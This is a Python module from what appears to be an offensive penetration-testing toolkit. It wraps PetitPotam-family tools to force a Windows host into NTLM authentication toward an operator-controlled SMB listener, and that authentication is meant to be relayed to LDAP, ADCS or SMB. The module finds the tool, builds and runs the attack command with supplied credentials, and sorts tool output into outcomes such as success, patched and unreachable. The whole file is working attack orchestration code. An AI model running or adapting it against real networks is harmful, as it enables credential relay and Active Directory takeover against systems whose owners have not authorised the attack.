"""PetitPotam (MS-EFSR EfsRpcOpenFileRaw) coerce primitive.

The 2021 CVE-2021-36942-adjacent coerce: any authenticated (and on some
older builds, even unauthenticated) client can call
``EfsRpcOpenFileRaw`` against a Windows machine over the MS-EFSR pipe,
passing a UNC path as the "file to read". The target's LSASS opens
that UNC → authenticates outbound to whatever the operator points at.
The auth is NTLM by default and relayable to LDAP, ADCS, or SMB
(chained in :mod:`fieldkit.chain`'s esc8 profile).

D2 landing strategy: **wrap a PetitPotam-family tool if one is on
PATH**, otherwise return a ``no-tool`` result whose ``command_hint``
tells the operator the exact command to run themselves. The chain
step maps ``no-tool`` to a ``manual`` Outcome — the "prepare-only
playbook" fallback that Path 2's design locked in.

We do NOT attempt a from-scratch MS-EFSR RPC client in this slice.
The impacket build on this Kali doesn't ship examples/PetitPotam.py
(nor do most modern impacket packages), and reimplementing DCERPC +
EFSRPC pack+unpack from scratch is a genuine month of code — well
outside D2's charter. D4 can revisit if a lightweight from-scratch
implementation becomes worth the maintenance load.
"""
import os
import shutil

from . import CoerceResult
from .. import runner


#: Ordered list of tool binaries we recognize. First hit wins. The
#: names cover the common install shapes:
#:   * ``impacket-PetitPotam`` — kali's impacket-scripts package
#:   * ``PetitPotam.py``       — the original ly4k / topotam standalone,
#:                               operators typically clone into arsenal
_TOOL_SEARCH_ORDER = ("impacket-PetitPotam", "PetitPotam.py")


def find_tool(arsenal_hint=None):
    """Locate a PetitPotam-family tool, or return None. Consults PATH
    for :data:`_TOOL_SEARCH_ORDER` first, then ``arsenal_hint`` (a
    directory the operator's fieldkit config points at).

    Returns the absolute path to the tool binary, or None if nothing
    was found — caller falls back to a manual outcome with a command
    hint the operator runs themselves.
    """
    for name in _TOOL_SEARCH_ORDER:
        found = shutil.which(name)
        if found:
            return found
    if arsenal_hint:
        for name in _TOOL_SEARCH_ORDER:
            candidate = os.path.join(arsenal_hint, name)
            if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
                return candidate
    return None


#: PetitPotam-family tools converge on a couple of output signatures
#: for the trigger outcome. `_classify_output` maps stdout+stderr text
#: to a CoerceResult kind by regex-adjacent substring match — simpler
#: than versioned per-tool parsers and stable across the shipping
#: shapes I've seen (impacket-scripts, ly4k/topotam, ExAndroidDev's
#: fork). Order matters — first match wins, so put the more-specific
#: patterns before the less-specific.
_OUTPUT_SIGNATURES = (
    # Success — the coerce trigger was accepted; auth is now in flight
    ("Attack worked",           "ok"),
    ("check smbserver",         "ok"),
    ("Received!",               "ok"),
    ("Successfully bound",      "ok"),   # tool got past bind → almost always fires
    # Patched / access-denied
    ("RPC_S_ACCESS_DENIED",     "patched"),
    ("ERROR_ACCESS_DENIED",     "patched"),
    ("STATUS_ACCESS_DENIED",    "patched"),
    ("nca_s_fault_access_denied", "patched"),
    # Auth failures
    ("STATUS_LOGON_FAILURE",    "auth-error"),
    ("KDC_ERR_",                "auth-error"),
    # Reachability
    ("Connection refused",      "unreachable"),
    ("timed out",               "unreachable"),
    ("Name or service not known", "unreachable"),
    ("STATUS_IO_TIMEOUT",       "unreachable"),
)


def _classify_output(text):
    """Return the CoerceResult kind implied by ``text``. Defaults to
    ``fail`` — an unexpected tool output surfaces for diagnosis
    rather than getting silently classified as one of the known
    branches."""
    for signature, kind in _OUTPUT_SIGNATURES:
        if signature in text:
            return kind
    return "fail"


def _build_command_hint(tool_bin, target, listener_uri, cred):
    """The command string a `no-tool` result surfaces to the operator.
    Same shape whether the tool was found or not — for consistency in
    what fieldkit tells the operator to run manually."""
    tool = tool_bin or "python3 PetitPotam.py"
    auth = ""
    if cred:
        u = cred.get("username") or ""
        p = cred.get("password") or ""
        d = cred.get("domain") or ""
        # PetitPotam-family tools take -u/-p/-d
        auth = f" -u '{u}' -p '{p}'"
        if d:
            auth = f"{auth} -d '{d}'"
    # PetitPotam.py positional args: <listener> <target>
    return f"{tool}{auth} '{listener_uri}' '{target}'"


def fire(target, listener_uri, cred=None, tool_bin=None,
         tool_timeout=15, arsenal_hint=None):
    """Attempt the MS-EFSR EfsRpcOpenFileRaw coerce against ``target``,
    telling it to authenticate outbound to ``listener_uri``.

    Args:
      target:        the DC/host to coerce (IP or hostname). The tool
                     resolves this to the MS-EFSR RPC endpoint.
      listener_uri:  SMB path the target will attempt to auth to
                     (e.g. ``\\\\10.0.0.5\\share`` or
                     ``\\\\10.0.0.5\\pipe\\anything``). D3's relay
                     listener lives at this URI.
      cred:          optional {domain, username, password} dict for
                     auth to the target (some hardened builds require
                     it for MS-EFSR access).
      tool_bin:      explicit path to a PetitPotam-family tool. When
                     None, :func:`find_tool` walks PATH + arsenal_hint.
      tool_timeout:  subprocess timeout in seconds; default 15 is
                     generous for the tool's own RPC round-trips.
      arsenal_hint:  directory to also search for the tool binary
                     (config option in future — for now None).

    Returns a :class:`~fieldkit.coerce.CoerceResult`. The chain step
    branches on ``.kind``: ``ok``/``patched``/``unreachable``/
    ``auth-error``/``fail`` come from the tool; ``no-tool`` when
    nothing viable was found.
    """
    if not tool_bin:
        tool_bin = find_tool(arsenal_hint=arsenal_hint)

    if not tool_bin:
        hint = _build_command_hint(None, target, listener_uri, cred)
        return CoerceResult(
            kind="no-tool",
            evidence=("no PetitPotam-family tool on PATH; install "
                      "impacket-scripts or clone topotam/PetitPotam.py"),
            command_hint=hint,
            listener_uri=listener_uri)

    argv = [tool_bin]
    if cred:
        u = cred.get("username") or ""
        p = cred.get("password") or ""
        d = cred.get("domain") or ""
        if u:
            argv += ["-u", u]
        if p:
            argv += ["-p", p]
        if d:
            argv += ["-d", d]
    argv += [listener_uri, target]

    # runner.run wraps subprocess.run — catches FileNotFoundError as
    # a RunResult(error=…) and TimeoutExpired via .timed_out. Two
    # branches downstream: `error` → tool vanished (rare race),
    # `timed_out` → target likely unreachable.
    result = runner.run(argv, timeout=tool_timeout)
    if result.error and "not found" in result.error:
        return CoerceResult(
            kind="no-tool",
            evidence=f"tool binary {tool_bin!r} vanished before exec",
            command_hint=_build_command_hint(tool_bin, target, listener_uri, cred),
            listener_uri=listener_uri)
    if result.timed_out:
        return CoerceResult(
            kind="unreachable",
            evidence=f"tool timed out after {tool_timeout}s — target likely unreachable",
            detail=result.stdout + result.stderr,
            listener_uri=listener_uri)

    output = result.stdout + result.stderr
    kind = _classify_output(output)
    # A non-zero exit with an unrecognized output → keep as `fail`
    # (already the default); the detail carries the whole output.
    return CoerceResult(
        kind=kind,
        evidence={
            "ok":          f"MS-EFSR trigger accepted; auth in flight to {listener_uri}",
            "patched":     f"{target}: MS-EFSR patched (RPC_S_ACCESS_DENIED)",
            "auth-error":  f"{target}: auth failed against MS-EFSR endpoint",
            "unreachable": f"{target}: MS-EFSR endpoint unreachable",
            "fail":        f"{tool_bin} exited {result.exit_code} with unrecognized output",
        }[kind],
        detail=output,
        listener_uri=listener_uri)
